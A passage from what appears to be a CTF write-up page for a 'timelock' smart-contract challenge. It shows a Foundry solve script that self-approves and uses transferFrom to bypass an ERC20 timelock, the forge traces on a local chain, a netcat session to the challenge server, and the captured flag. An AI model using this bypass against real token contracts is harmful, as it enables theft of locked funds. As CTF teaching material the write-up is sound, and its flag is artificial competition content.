+        vm.startBroadcast(deployerPrivateKey);
+        
+        Timelock token = Timelock(timelock);
+        address player = vm.addr(deployerPrivateKey);
+        
+        uint256 balance = token.balanceOf(player);
+        console.log("Player balance:", balance);
+        
+        // Step 1: Approve ourselves to spend our own tokens
+        token.approve(player, balance);
+        console.log("Approved:", balance);
+        
+        // Step 2: Use transferFrom to bypass the timelock
+        // Transfer to any address (we'll use address(1) as burn)
+        token.transferFrom(player, address(0x1), balance);
+        console.log("Transferred via transferFrom!");
+        
+        // Step 3: Verify balance is 0
+        uint256 newBalance = token.balanceOf(player);
+        console.log("New balance:", newBalance);
+        
+        // Step 4: Call solve
+        Challenge(challenge).solve();
+        console.log("Challenge solved!");
+        
+        vm.stopBroadcast();
+    }
+}
+</code></pre>
+
+<ul>
+  <li>Run the command:</li>
+</ul>
+
+<pre><code class="language-Bash">   nithin@ScateR:~/SCATERLABs/CTFs/Block1/bloc2$ forge script script/Solve.s.sol:SolveScript --rpc-url $RPC_URL --broadcast --legacy -vvvv
+</code></pre>
+
+<ul>
+  <li>Result Logs:</li>
+</ul>
+
+<pre><code class="language-Bash"> nithin@ScateR:~/SCATERLABs/CTFs/Block1/bloc2$ source .env
+nithin@ScateR:~/SCATERLABs/CTFs/Block1/bloc2$ forge script script/Solve.s.sol:SolveScript --rpc-url $RPC_URL --broadcast --legacy -vvvv
+[⠒] Compiling...
+No files changed, compilation skipped
+Traces:
+  [104448] SolveScript::run()
+    ├─ [0] VM::envUint("PRIVATE_KEY") [staticcall]
+    │   └─ ← [Return] &lt;env var value&gt;
+    ├─ [0] VM::envAddress("TIMELOCK") [staticcall]
+    │   └─ ← [Return] &lt;env var value&gt;
+    ├─ [0] VM::envAddress("CHALLENGE") [staticcall]
+    │   └─ ← [Return] &lt;env var value&gt;
+    ├─ [0] VM::startBroadcast(&lt;pk&gt;)
+    │   └─ ← [Return]
+    ├─ [0] VM::addr(&lt;pk&gt;) [staticcall]
+    │   └─ ← [Return] 0xc3c7408C6926E23fB1A46b58AE315eC4710F8732
+    ├─ [2850] 0x7dB30A7050776E09A9a360865Acca1A4Df55b4b6::balanceOf(0xc3c7408C6926E23fB1A46b58AE315eC4710F8732) [staticcall]
+    │   └─ ← [Return] 1000000000000000000000000 [1e24]
+    ├─ [0] console::log("Player balance:", 1000000000000000000000000 [1e24]) [staticcall]
+    │   └─ ← [Stop]
+    ├─ [25296] 0x7dB30A7050776E09A9a360865Acca1A4Df55b4b6::approve(0xc3c7408C6926E23fB1A46b58AE315eC4710F8732, 1000000000000000000000000 [1e24])
+    │   ├─ emit Approval(owner: 0xc3c7408C6926E23fB1A46b58AE315eC4710F8732, spender: 0xc3c7408C6926E23fB1A46b58AE315eC4710F8732, value: 1000000000000000000000000 [1e24])
+    │   └─ ← [Return] true
+    ├─ [0] console::log("Approved:", 1000000000000000000000000 [1e24]) [staticcall]
+    │   └─ ← [Stop]
+    ├─ [29614] 0x7dB30A7050776E09A9a360865Acca1A4Df55b4b6::transferFrom(0xc3c7408C6926E23fB1A46b58AE315eC4710F8732, ECRecover: [0x0000000000000000000000000000000000000001], 1000000000000000000000000 [1e24])
+    │   ├─ emit Transfer(from: 0xc3c7408C6926E23fB1A46b58AE315eC4710F8732, to: ECRecover: [0x0000000000000000000000000000000000000001], value: 1000000000000000000000000 [1e24])
+    │   └─ ← [Return] true
+    ├─ [0] console::log("Transferred via transferFrom!") [staticcall]
+    │   └─ ← [Stop]
+    ├─ [850] 0x7dB30A7050776E09A9a360865Acca1A4Df55b4b6::balanceOf(0xc3c7408C6926E23fB1A46b58AE315eC4710F8732) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [0] console::log("New balance:", 0) [staticcall]
+    │   └─ ← [Stop]
+    ├─ [23895] 0xf00F7a89E5da858edB45744e4464E468897c1e1e::solve()
+    │   ├─ [850] 0x7dB30A7050776E09A9a360865Acca1A4Df55b4b6::balanceOf(0xc3c7408C6926E23fB1A46b58AE315eC4710F8732) [staticcall]
+    │   │   └─ ← [Return] 0
+    │   └─ ← [Stop]
+    ├─ [0] console::log("Challenge solved!") [staticcall]
+    │   └─ ← [Stop]
+    ├─ [0] VM::stopBroadcast()
+    │   └─ ← [Return]
+    └─ ← [Stop]
+
+
+Script ran successfully.
+
+== Logs ==
+  Player balance: 1000000000000000000000000
+  Approved: 1000000000000000000000000
+  Transferred via transferFrom!
+  New balance: 0
+  Challenge solved!
+
+## Setting up 1 EVM.
+==========================
+Simulated On-chain Traces:
+
+  [25296] 0x7dB30A7050776E09A9a360865Acca1A4Df55b4b6::approve(0xc3c7408C6926E23fB1A46b58AE315eC4710F8732, 1000000000000000000000000 [1e24])
+    ├─ emit Approval(owner: 0xc3c7408C6926E23fB1A46b58AE315eC4710F8732, spender: 0xc3c7408C6926E23fB1A46b58AE315eC4710F8732, value: 1000000000000000000000000 [1e24])
+    └─ ← [Return] true
+
+  [36414] 0x7dB30A7050776E09A9a360865Acca1A4Df55b4b6::transferFrom(0xc3c7408C6926E23fB1A46b58AE315eC4710F8732, ECRecover: [0x0000000000000000000000000000000000000001], 1000000000000000000000000 [1e24])
+    ├─ emit Transfer(from: 0xc3c7408C6926E23fB1A46b58AE315eC4710F8732, to: ECRecover: [0x0000000000000000000000000000000000000001], value: 1000000000000000000000000 [1e24])
+    └─ ← [Return] true
+
+  [28395] 0xf00F7a89E5da858edB45744e4464E468897c1e1e::solve()
+    ├─ [2850] 0x7dB30A7050776E09A9a360865Acca1A4Df55b4b6::balanceOf(0xc3c7408C6926E23fB1A46b58AE315eC4710F8732) [staticcall]
+    │   └─ ← [Return] 0
+    └─ ← [Stop]
+
+
+==========================
+
+Chain 31337
+
+Estimated gas price: 1.7756804 gwei
+
+Estimated total gas used for script: 204292
+
+Estimated amount required: 0.0003627573002768 ETH
+
+==========================
+
+##### anvil-hardhat
+✅  [Success] Hash: 0x29230c2b2ecaa6c50f10dd9cf7bf011041a3ef6dd6e07709efecabab33aa96bd
+Block: 3
+Paid: 0.000083350437976 ETH (46940 gas * 1.7756804 gwei)
+
+
+##### anvil-hardhat
+✅  [Success] Hash: 0x732a8a01c8f4eeb5ecba94790f10049b4fbc4dacf0e7e4f081281101f35a2697
+Block: 4
+Paid: 0.0000878233769036 ETH (49459 gas * 1.7756804 gwei)
+
+
+##### anvil-hardhat
+✅  [Success] Hash: 0x3a344d2618f955b3c12bb1e4796bb5deaaf42168e119faaeecaacdf59bdc503d
+Block: 4
+Paid: 0.0000862945160792 ETH (48598 gas * 1.7756804 gwei)
+
+✅ Sequence #1 on anvil-hardhat | Total Paid: 0.0002574683309588 ETH (144997 gas * avg 1.7756804 gwei)
+                                                                 
+
+==========================
+
+ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.
+
+Transactions saved to: /home/nithin/SCATERLABs/CTFs/Block1/bloc2/broadcast/Solve.s.sol/31337/run-latest.json
+
+Sensitive values saved to: /home/nithin/SCATERLABs/CTFs/Block1/bloc2/cache/Solve.s.sol/31337/run-latest.json
+
+nithin@ScateR:~/SCATERLABs/CTFs/Block1/bloc2$ forge script script/Solve.s.sol:SolveScript --rpc-url $RPC_URL --broadcast --legacy -vvvv
+[⠊] Compiling...
+No files changed, compilation skipped
+^C
+nithin@ScateR:~/SCATERLABs/CTFs/Block1/bloc2$ cast call $CHALLENGE "isSolved()(bool)" --rpc-url $RPC_URL
+true ## true means the challenge is solved!
+</code></pre>
+
+<ul>
+  <li>To get Flag:</li>
+</ul>
+
+<pre><code class="language-Bash">nithin@ScateR:~/SCATERLABs/CTFs/Block1/bloc2$ nc 161.97.155.116 6970
+
+ ██████╗ ███╗   ██╗ ██████╗ ███████╗███████╗ ██████╗     ██████╗████████╗███████╗
+██╔═══██╗████╗  ██║██╔═══██╗██╔════╝██╔════╝██╔════╝    ██╔════╝╚══██╔══╝██╔════╝
+██║   ██║██╔██╗ ██║██║   ██║███████╗█████╗  ██║         ██║        ██║   █████╗  
+██║▄▄ ██║██║╚██╗██║██║▄▄ ██║╚════██║██╔══╝  ██║         ██║        ██║   ██╔══╝  
+╚██████╔╝██║ ╚████║╚██████╔╝███████║███████╗╚██████╗    ╚██████╗   ██║   ██║     
+ ╚══▀▀═╝ ╚═╝  ╚═══╝ ╚══▀▀═╝ ╚══════╝╚══════╝ ╚═════╝     ╚═════╝   ╚═╝   ╚═╝     
+
+[timelock] Welcome anon!
+[timelock] 1 - Launch a new instance
+[timelock] 2 - Kill your instance
+[timelock] 3 - Get the flag
+[timelock] Action? 3
+
+[timelock] What is your ticket? 5e1412cd7083b4b49f31098c9b322b16
+[timelock] Nicely done! Now don't lose it: QnQSec{gr3at_j0b_y0u_l3arn7_4b0u7_3rc20_t0k3n5}
+
+</code></pre>
+
+
+  </div><a class="u-url" href="/writeups/2025/10/19/QnsecCTF.html" hidden></a>
+</article>
+
+    </main>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function () {
+            // Copy button functionality for code blocks
+            const preBlocks = document.querySelectorAll('pre');
+            preBlocks.forEach(pre => {
+                if (pre.parentNode.classList.contains('code-container')) return; // Avoid re-wrapping
+                const container = document.createElement('div');
+                container.className = 'code-container';
+                const copyButton = document.createElement('button');
+                copyButton.className = 'copy-button';
+                copyButton.textContent = 'Copy';
+                pre.parentNode.insertBefore(container, pre);
+                container.appendChild(pre);
+                container.appendChild(copyButton);
+                copyButton.addEventListener('click', () => {
+                    const code = pre.querySelector('code').innerText;
+                    navigator.clipboard.writeText(code).then(() => {
+                        copyButton.textContent = 'Copied!';
+                        setTimeout(() => {
+                            copyButton.textContent = 'Copy';
+                        }, 2000);
+                    }).catch(err => {
+                        console.error('Failed to copy: ', err);
+                    });
+                });
+            });
+
+            // Mobile menu toggle functionality
+            const menuToggle = document.getElementById('menuToggle');
+            const mainNav = document.getElementById('mainNav');
+
+            if (menuToggle && mainNav) {
+                menuToggle.addEventListener('click', function () {
+                    mainNav.classList.toggle('active');
+                    menuToggle.classList.toggle('active');
+                });
+
+                // Close menu when clicking on a link
+                const navLinks = mainNav.querySelectorAll('a');
+                navLinks.forEach(link => {
+                    link.addEventListener('click', () => {
+                        mainNav.classList.remove('active');
+                        menuToggle.classList.remove('active');
+                    });
+                });
+
+                // Close menu when clicking outside
+                document.addEventListener('click', function (event) {
+                    const isClickInsideNav = mainNav.contains(event.target);
+                    const isClickOnToggle = menuToggle.contains(event.target);
+
+                    if (!isClickInsideNav && !isClickOnToggle && mainNav.classList.contains('active')) {
+                        mainNav.classList.remove('active');
+                        menuToggle.classList.remove('active');
+                    }
+                });
+            }
+        });
+    </script>
+</body>
+
+</html>
